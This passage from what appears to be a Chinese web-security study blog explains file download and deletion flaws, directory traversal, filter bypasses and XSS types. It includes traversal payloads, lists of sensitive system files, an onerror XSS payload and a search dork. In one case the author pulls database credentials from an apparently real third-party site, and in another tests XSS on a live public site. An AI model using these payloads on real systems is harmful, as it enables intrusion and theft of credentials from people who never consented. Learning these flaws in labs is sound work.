alt=\"image-20250810125138387\"></p>\n</li>\n</ul>\n<h3 id=\"文件下载-2\">文件下载</h3>\n<h4 id=\"一、文件安全-下载-删除-黑白盒\">一、文件安全-下载&amp;删除-黑白盒</h4>\n<h5 id=\"1-任意文件下载\">1.任意文件下载</h5>\n<p><strong>原理</strong>：</p>\n<ul>\n<li>下载 = 读取</li>\n<li>常规下载 URL：<code>http://www.xiaodi8.com/upload/123.pdf</code>\n<ul>\n<li>直连下载，如果访问 <code>http://www.xiaodi8.com/upload/1.php</code>，他可能就不是下载文件，而是解析 <code>php</code> 代码了</li>\n</ul>\n</li>\n<li>可能存在安全 URL：<code>http://www.xiaodi8.com/download.php?file=123.pdf</code>\n<ul>\n<li>而如果是这种，就说明他是传参进去的，那就已经 <strong>固定好下载协议</strong> 了，如果没做过滤这些，他就会去尝试下载其他文件</li>\n</ul>\n</li>\n<li><strong>当下载文件时是通过参数传递的文件名</strong>，那就可能存在下载安全</li>\n<li>利用：常规下载敏感文件（数据库配置，中间件配置，系统密钥等文件信息）</li>\n<li>比如 <code>Linux</code> 下，参考文章：<a href=\"https://www.cnblogs.com/lzlzzzzzz/p/13446719.html\">Linux 常见的敏感目录 - 楼–楼 - 博客园</a></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/passwd: 这个文件包含了操作系统用户信息。</span><br><span class=\"line\">/etc/shadow: 这个文件包含了操作系统用户的密码<span class=\"built_in\">hash</span>。</span><br><span class=\"line\">/etc/sudoers: sudoers文件与<span class=\"built_in\">sudo</span>命令相关，用于控制用户以其他身份执行命令的权限。</span><br><span class=\"line\">/root/.ssh/authorized_keys: 存储了允许通过SSH登录的用户的公钥。</span><br><span class=\"line\">/etc/my.cnf: MySQL数据库的配置文件，包含了数据库服务器的设置。</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<ul>\n<li>再比如 <code>Windows</code> 下：<a href=\"https://blog.csdn.net/qq_63844103/article/details/128008820\">【安全知识】——系统敏感文件路径汇总_windows10 安全 敏感文件存放位置-CSDN 博客</a></li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">c:/<span class=\"title\">boot.ini</span>: 查看系统版本</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">c</span>:/<span class=\"title\">windows</span>/<span class=\"title\">php.ini</span>: <span class=\"title\">php</span>配置信息</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">c</span>:/<span class=\"title\">windows</span>/<span class=\"title\">my.ini</span>: <span class=\"title\">MYSQL</span>配置文件，记录管理员登陆过的<span class=\"title\">MYSQL</span>用户名和密码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">c</span>:\\<span class=\"title\">mysql</span>\\<span class=\"title\">data</span>\\<span class=\"title\">mysql</span>\\<span class=\"title\">user.MYD</span>: 存储了<span class=\"title\">mysql.user</span>表中的数据库连接密码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">c</span>:\\<span class=\"title\">windows</span>\\<span class=\"title\">repair</span>\\<span class=\"title\">sam</span>: 存储了<span class=\"title\">WINDOWS</span>系统初次安装的密码</span></span><br><span class=\"line\"><span class=\"function\">...</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>当然很多时候 <strong>可能并不能成功下载或读取，主要跟主机的策略有关</strong></li>\n</ul>\n<h6 id=\"演示案例一-文件下载\">演示案例一  文件下载</h6>\n<ul>\n<li>\n<p>这里用一个国外的网站做演示案例：<code>https://67.202.70.133/files/readfile.php?file=xxx</code></p>\n</li>\n<li>\n<p>我们可以通过这个点去下载一些文件，这里我们就尝试下载当前的 <code>readfile.php</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813114809093.png\" alt=\"image-20250813114809093\"></p>\n</li>\n<li>\n<p>可以看到是能够成功下载的，那我们下载之后看一看源码：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813114833620.png\" alt=\"image-20250813114833620\"></p>\n</li>\n<li>\n<p>这就是下载文件的东西，一般我们都会尝试下载 <code>index.php</code> 看一看首页这些有没有包含什么配置文件之类，那这里也是尝试下载一下</p>\n</li>\n<li>\n<p>注意，现在我们的位置是 <code>/files/</code> 目录，所以需要返回上一层：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813114928812.png\" alt=\"image-20250813114928812\"></p>\n</li>\n<li>\n<p>这里是没有任何过滤的，然后看一看源码：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115046258.png\" alt=\"image-20250813115046258\"></p>\n</li>\n<li>\n<p>这里呢，它 <code>index.php</code> 文件中没有暴露配置文件的位置，但是却暴露了框架的类型，可以看到注释中的 <code>Joomla.Site</code></p>\n</li>\n<li>\n<p>我们可以去搜一下这个是什么：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Joomla 是一个全球知名的内容管理系统（CMS），用于发布和管理Web内容。</span><br><span class=\"line\">它是一个开源项目，使用PHP语言和MySQL数据库开发，支持在Linux、Windows、MacOSX等多种平台上运行</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>所以我们可以看看它默认的 <a href=\"https://so.csdn.net/so/search?q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84&amp;spm=1001.2101.3001.7020\">配置文件路径</a> 放在什么地方，就放在 <code>Home/username/public_html/configuration.php</code>，那这里应该就在根目录下面，尝试访问下载：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115203234.png\" alt=\"image-20250813115203234\"></p>\n</li>\n<li>\n<p>确实有，成功获取到 <a href=\"https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.7020\">数据库</a> 账号密码信息:</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115241979.png\" alt=\"image-20250813115241979\"></p>\n</li>\n</ul>\n<h6 id=\"演示案例二-文件读取\">演示案例二  文件读取</h6>\n<ul>\n<li>\n<p>这里以 <a href=\"https://so.csdn.net/so/search?q=BP&amp;spm=1001.2101.3001.7020\">BP</a> 的靶场作为案例，演示一下文件读取和文件下载的一个相似之处吧</p>\n</li>\n<li>\n<p>靶场地址为： <a href=\"https://portswigger.net/\">https://portswigger.net/</a> ，需要登录才能使用</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115509328.png\" alt=\"image-20250813115509328\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115524143-1755057325015-1.png\" alt=\"image-20250813115524143\"></p>\n</li>\n<li>\n<p>这里我们随便点击一个图片看看参数结构：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115605505.png\" alt=\"image-20250813115605505\"></p>\n</li>\n<li>\n<p>比如这张图片他的地址为 <code>image?filename=38.jpg</code>，那这里就是通过传参去进行查找图片的，这就可能出现任意文件读取漏洞</p>\n</li>\n<li>\n<p>我们 BP 抓包，然后尝试读取其他文件，比如看看有没有 <code>index.php</code> 文件：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115641908.png\" alt=\"image-20250813115641908\"></p>\n</li>\n<li>\n<p>会提示没有此文件，他这里输入 <code>../</code> 也不会报错或提示权限不够，那我们就直接尝试读取 <code>../../../etc/passwd</code> 看看能不能读取</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813115724446.png\" alt=\"image-20250813115724446\"></p>\n</li>\n<li>\n<p>可以看到是能够成功读取的，其实这个应该是目录穿越的内容，不过也差不多，因为很多漏洞都是组合使用才能出效果的</p>\n</li>\n</ul>\n<h5 id=\"2-任意文件删除\">2.任意文件删除</h5>\n<p><strong>原理</strong></p>\n<ul>\n<li>这个常常出现在后台中</li>\n<li>当前台或者后台存在删除功能点时，可能存在这样的安全问题</li>\n<li>利用：<strong>常规删除重装锁定配合程序重装或高危操作</strong></li>\n<li>需要注意的是，删除文件是高危操作，一般都是看能不能删除自己的文件，然后进行删除操作，不然删到了敏感文件就 gg 了</li>\n</ul>\n<h6 id=\"演示案例\">演示案例</h6>\n<ul>\n<li>\n<p>我们使用 <code>seacms</code> 这个 CMS 框架作为演示案例</p>\n</li>\n<li>\n<p>成功安装之后，我们登入后台，然后找到删除功能点：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813120611377.png\" alt=\"image-20250813120611377\"></p>\n</li>\n<li>\n<p>然后我们随便点一个，抓包看看他的传参形式是否可能存在漏洞：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813120639303-1755057999877-3.png\" alt=\"image-20250813120639303\"></p>\n</li>\n<li>\n<p>可以看到它的传参形式是 <code>filedir=xxxx</code> 的类型，那就有可能存在漏洞，这里我们在比如根目录下添加一个 <code>1.txt</code>，看他能不能删除：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813120722755.png\" alt=\"image-20250813120722755\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813120740022.png\" alt=\"image-20250813120740022\"></p>\n</li>\n<li>\n<p>这里提示只能删除 <code>templets</code> 目录下的文件，那说明限制了目录，那我们就改一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813120820655.png\" alt=\"image-20250813120820655\"></p>\n</li>\n<li>\n<p>删除成功，所以这个是存在目录穿越以及任意文件删除的</p>\n</li>\n</ul>\n<h4 id=\"二、-目录安全-遍历-穿越-黑白盒\">二、 目录安全-遍历&amp;穿越-黑白盒</h4>\n<h5 id=\"1-目录遍历\">1.目录遍历</h5>\n<ul>\n<li>\n<p>目录遍历是 <strong>因为权限控制不当</strong>，导致攻击者可以通过遍历获取到有价值的信息文件去利用</p>\n</li>\n<li>\n<p>该漏洞与网站源码目录的设置有关，比如这里的 <code>seacms</code>，我们可以右击文件夹然后找到安全：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813121347625.png\" alt=\"image-20250813121347625\"></p>\n</li>\n<li>\n<p>这里如果对应的角色有“列出文件夹内容”的权限，那就可能有这个漏洞</p>\n</li>\n<li>\n<p>而在中间件中，就与网站的配置有关，比如这里小皮有一个 <strong>目录索引</strong> 的选项，我们可以开启看一看：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813121452704.png\" alt=\"image-20250813121452704\"></p>\n</li>\n<li>\n<p>之后我们再去访问刚刚的官网，这里你会发现访问有的目录它会显示目录遍历的结果，访问有的目录它仍然显示 <code>php</code> 解析后的内容：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813121740287.png\" alt=\"image-20250813121740287\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813121904798.png\" alt=\"image-20250813121904798\"></p>\n</li>\n<li>\n<p>这是因为设置里有一个网站首页，就是说如果有 <code>index.php</code>、<code>index.html</code> 这样的文件存在的话，那就解析这个文件，就不会形成目录遍历</p>\n</li>\n<li>\n<p>那这个漏洞存在还是蛮多的，我们可以去 <code>fofa</code> 上搜一搜，语法为：<code>&quot;index of /&quot; &amp;&amp; title==&quot;index of /&quot;</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813121959542.png\" alt=\"image-20250813121959542\"></p>\n</li>\n<li>\n<p>比如这个网站，就有可能泄露一些配置文件或者一些隐私文件</p>\n</li>\n</ul>\n<h5 id=\"2-目录穿越\">2.目录穿越</h5>\n<ul>\n<li>\n<p>目录穿越是 <strong>因为权限控制不当以及过滤不全</strong>，导致攻击者可以通过使用 <code>../</code> 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录</p>\n</li>\n<li>\n<p>需要注意的一点是，<strong>它和目录遍历不等同</strong>，只是他们两个经常一起出现配合使用；目录遍历是遍历出某个文件夹的所有目录文件，而目录穿越是可以穿越到其他文件夹</p>\n</li>\n<li>\n<p>我们还是以刚才的 <code>seacms</code> 为例子，还是熟悉的模板那里：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813133037304.png\" alt=\"image-20250813133037304\"></p>\n</li>\n<li>\n<p>我们可以看到上面显示了一个 <code>当前目录：xxxx</code>，那这里可不可能存在目录穿越呢？</p>\n</li>\n<li>\n<p>复制这个 <code>html</code> 的网址链接如上，然后我们发现它也是通过传递参数去实现显示目录的</p>\n</li>\n<li>\n<p>抓包，将参数改为 <code>/</code> 看看：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813133139815.png\" alt=\"image-20250813133139815\"></p>\n</li>\n<li>\n<p>提示只能编辑 <code>templets</code>，那我们保持当前目录为 <code>templets</code>，然后使用 <code>../</code> 看能不能穿越到其他目录：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813133204262.png\" alt=\"image-20250813133204262\"></p>\n</li>\n<li>\n<p>可以看到，绕过了刚刚的限制，访问到了网站的根目录，那这里就存在目录穿越以及目录遍历的漏洞</p>\n</li>\n<li>\n<p>之后的话就可以尝试访问一些配置文件看看能不能配合其他的漏洞打一打了</p>\n</li>\n</ul>\n<h5 id=\"3-黑盒分析\">3.黑盒分析</h5>\n<ul>\n<li><strong>功能点</strong>：文件上传、文件下载、文件删除、文件管理器等地方</li>\n<li><strong>URL 特征</strong>：\n<ul>\n<li>文件名：<code>download</code>、<code>down</code>、<code>readfile</code>、<code>read</code>、<code>del</code>、<code>dir</code>、<code>path</code>、<code>src</code>、<code>lang</code> 等</li>\n<li>参数名：<code>file</code>、<code>path</code>、<code>data</code>、<code>filepath</code>、<code>readfile</code>、<code>data</code>、<code>url</code>、<code>realpath</code> 等</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"4-白盒分析\">4.白盒分析</h5>\n<ul>\n<li>上传类函数、删除类函数、下载类函数、目录操作类函数、读取查看类函数等</li>\n</ul>\n<h5 id=\"5-常见绕过方式\">5.常见绕过方式</h5>\n<h6 id=\"绝对路径\">绝对路径</h6>\n<ul>\n<li>\n<p>web 网站有时候会采取目录遍历的防御措施，如过滤 …/ 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须…/返回上一级目录遍历：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=/etc/passwd</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"双写…-绕过\">双写…/绕过</h6>\n<ul>\n<li>\n<p>有时候，防御措施是直接将 …/ 替换为空，可以直接采用双写/复写直接绕过：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=....//....//....///etc/passwd</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>如果在…//中，将…/替换为空，最后的路径就变成：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">....//  =&gt; ../</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"URL-编码绕过\">URL 编码绕过</h6>\n<ul>\n<li>\n<p>也可以采用 URL 编码来绕过服务器对 . 或者 / 的检测：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.   =&gt;  %2e</span><br><span class=\"line\"></span><br><span class=\"line\">/   =&gt;  %2f</span><br><span class=\"line\"></span><br><span class=\"line\">% =&gt; %25  (双重URL编码)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"绝对路径配合…\">绝对路径配合…/</h6>\n<ul>\n<li>\n<p>有些 web 在获取 filename 图片文件的时候，会首先判断是否以一个固定的路径开头</p>\n</li>\n<li>\n<p>那么就可以配合…/来返回上一级遍历任意文件</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"截断文件后缀\">截断文件后缀</h6>\n<ul>\n<li>某些 web 对 filename 的文件类型作了限制，只有当后缀为图片时才解析</li>\n<li>这时候就可以利用 %00 来截断</li>\n</ul>\n<h3 id=\"XSS-跨站脚本攻击\">XSS 跨站脚本攻击</h3>\n<h4 id=\"一、基础类型\">一、基础类型</h4>\n<ul>\n<li>\n<p><strong>漏洞原理</strong>：接收输入数据，输出显示数据到前端页面后解析执行</p>\n</li>\n<li>\n<p><strong>分类</strong>：反射型（非持续、经过服务器）、存储型（持续、经过服务器）、DOM-BASE（非持续、不经过服务器）</p>\n</li>\n<li>\n<p><strong>扩展类型</strong>：<code>jquery</code>、<code>mxss</code>、<code>uxss</code>、<code>pdfxss</code>、<code>flashxss</code>、上传 <code>xss</code> 等</p>\n</li>\n<li>\n<p><strong>常用标签</strong>：<a href=\"https://www.freebuf.com/articles/web/340080.html\">xss 常用标签及绕过姿势总结 - FreeBuf 网络安全行业门户</a></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>: 定义超链接</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>: 嵌入图片</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>: 嵌入一个HTML文档</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">audio</span>&gt;</span>: 定义音频内容</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">video</span>&gt;</span>: 定义视频内容</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span>: 定义可缩放矢量图形</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>: 定义按钮</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>: 定义js脚本语句</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>攻击利用</strong>：盲打、<code>COOKIE</code> 盗取、凭证窃取、页面劫持、网络钓鱼、权限维持等</p>\n</li>\n<li>\n<p><strong>安全修复</strong>：字符过滤、实例化编码、<code>http_only</code>、<code>CSP</code> 防护、<code>WAF</code> 拦截等</p>\n</li>\n<li>\n<p><strong>测试流程</strong>：</p>\n<ul>\n<li>看看输出在哪里</li>\n<li>更改输入代码看执行（标签、过滤决定）</li>\n<li>如果不能执行 f12 看过滤情况，尝试绕过</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"1-分类测试\">1.分类测试</h5>\n<p><strong>测试点</strong>：</p>\n<ul>\n<li><strong>数据交互的地方</strong>：\n<ul>\n<li><code>get</code>、<code>post</code>、<code>headers</code>：<code>get</code> 就是看一些 URL 参数；<code>post</code> 就是一些登录点、留言板；<code>headers</code> 就是像 <code>UA</code> 头、<code>cookie</code></li>\n<li>反馈与浏览</li>\n<li>富文本编辑器</li>\n<li>各类标签插入和自定义</li>\n</ul>\n</li>\n<li><strong>数据输出的地方</strong>：\n<ul>\n<li>用户资料</li>\n<li>数据输出</li>\n<li>评论、留言等</li>\n<li>关键词、标签、说明</li>\n<li>文件上传</li>\n</ul>\n</li>\n<li>总结：<strong>任何可以自定义输入数据的地方都可以尝试 <code>XSS</code></strong></li>\n</ul>\n<h5 id=\"2-反射型-XSS\">2. 反射型 XSS</h5>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813150655478.png\" alt=\"image-20250813150655478\"></p>\n<ul>\n<li>\n<p>常见的情况是攻击者通过 <strong>构造一个恶意链接</strong> 的形式，诱导用户传播和打开</p>\n</li>\n<li>\n<p>由于 <strong>链接内所携带的参数会回显于页面中或作为页面的处理数据</strong>，最终造成 <code>XSS</code> 攻击</p>\n</li>\n<li>\n<p>反射型 XSS，属于低位漏洞，基本不收，因为想要造成危害比较困难。首先你得构造一个恶意链接，然后让别人点击，先不说别人会不会点吗，就算会点，浏览器的一些策略也可能会进行拦截，所以利用也是比较难的</p>\n</li>\n<li>\n<p>这里以一个真实网站为例： <a href=\"https://useragent.openadmintools.com/\">https://useragent.openadmintools.com/</a></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813151302085.png\" alt=\"image-20250813151302085\"></p>\n</li>\n<li>\n<p>这里它会自动获取你的 UA 头信息，而且这个 UA 头的输入我们是可控的，那么我们尝试输入 <code>xss</code> 语句看他会不会执行：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813151324769.png\" alt=\"image-20250813151324769\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813151336210-1755069217153-5.png\" alt=\"image-20250813151336210\"></p>\n</li>\n<li>\n<p>可以看到，弹出对话框，通过分析我们知道：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813151414021.png\" alt=\"image-20250813151414021\"></p>\n</li>\n<li>\n<p>这里它是因为它输出的地方没有做任何过滤，所以导致后面的 <code>xss</code> 语句正常插入并且执行了</p>\n</li>\n</ul>\n<h5 id=\"3-存储型-XSS\">3.存储型 XSS</h5>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813151626410.png\" alt=\"image-20250813151626410\"></p>\n<ul>\n<li>\n<p>存储型 <code>XSS</code> 是持久化的 <code>XSS</code> 攻击方式，它 <strong>将恶意代码存储于服务器端</strong>，比如数据库、留言页面、日志文件等，当其他用户访问该页面时就会触发代码，造成 <code>xss</code> 攻击</p>\n</li>\n<li>\n<p>这个漏洞的危害就比较大了，因为它是插入到一个正常页面的，你只需要浏览就能够触发</p>\n</li>\n<li>\n<p>这里还是以一个实际的案例来演示，这里我们搭建一个小皮控制面板：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813161517221.png\" alt=\"image-20250813161517221\"></p>\n</li>\n<li>\n<p>然后先利用管理员账号密码登录：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813161542306.png\" alt=\"image-20250813161542306\"></p>\n</li>\n<li>\n<p>这里可以看到右下角有一个操作日志，这里会记录用户登录情况，比如刚刚使用 <code>admin</code> 登录它就会记录</p>\n</li>\n<li>\n<p>这里我们可能不确定它是不是显示的就是用户名，我们可以再尝试输入其他的用户名登录一下，这里我就不试了，它确实是记录的登录时的用户名，并且登录失败也会记录：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813161633309.png\" alt=\"image-20250813161633309\"></p>\n</li>\n<li>\n<p>好，现在 <code>xss</code> 利用的两要素已经齐活了：<strong>有输入且可控，有输出前端回显</strong></p>\n</li>\n<li>\n<p>那我们就可以测试了，登录框写入 <code>xss</code> 语句：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813161716519.png\" alt=\"image-20250813161716519\"></p>\n</li>\n<li>\n<p>这里可能 <code>&lt;script&gt;</code> 语句被禁止了，试了几次都没成功，那可以换成其他的 <code>xss</code> 语句，比如 <code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code>，这里刷新后台就成功弹出 <code>xss</code> 信息：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813161738718.png\" alt=\"image-20250813161738718\"></p>\n</li>\n<li>\n<p>然后你每次刷新都会弹，只有当清除日志后才会失效，这就是存储型 <code>xss</code></p>\n</li>\n</ul>\n<h5 id=\"4-DOM-型-XSS\">4.DOM 型 XSS</h5>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813161840347.png\" alt=\"image-20250813161840347\"></p>\n<ul>\n<li>\n<p><code>DOM</code> 型 <code>XSS</code> 是通过 <strong>将恶意代码插入到客户端的 DOM 树</strong> 中，实现 <code>XSS</code> 攻击，无需经过服务器，因此相对来说比较难以检测</p>\n</li>\n<li>\n<p>那什么是 <code>DOM</code> 树呢，之前安全开发也讲过，<code>DOM</code> 是文档访问对象模型，其实就是 <strong>将 html 标签元素都看成对象，然后通过对象去访问其方法和属性</strong></p>\n</li>\n<li>\n<p>而 DOM 树就是这个东西分层之后看起来像树一样的树形结构图</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813162014324.png\" alt=\"image-20250813162014324\"></p>\n</li>\n<li>\n<p>然后 <code>DOM-XSS</code> 的利用方式有很多种，详细看这篇文章：<a href=\"https://www.cnblogs.com/mysticbinary/p/12542695.html#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86\">DOM-XSS 攻击原理与防御 - Mysticbinary - 博客园</a></p>\n</li>\n<li>\n<p>我们就讲解比较常见的一种——跳转类 <code>DOM-XSS</code>，首先以代码的视角去讲解：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">    <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span> DOM-XSS TEST <span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span>  </span><br><span class=\"line\">    <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">  </span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"keyword\">var</span> hash = location.<span class=\"property\">hash</span>;  </span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"keyword\">if</span>(hash)&#123;  </span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">                <span class=\"keyword\">var</span> url = hash.<span class=\"title function_\">substring</span>(<span class=\"number\">1</span>);  </span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span 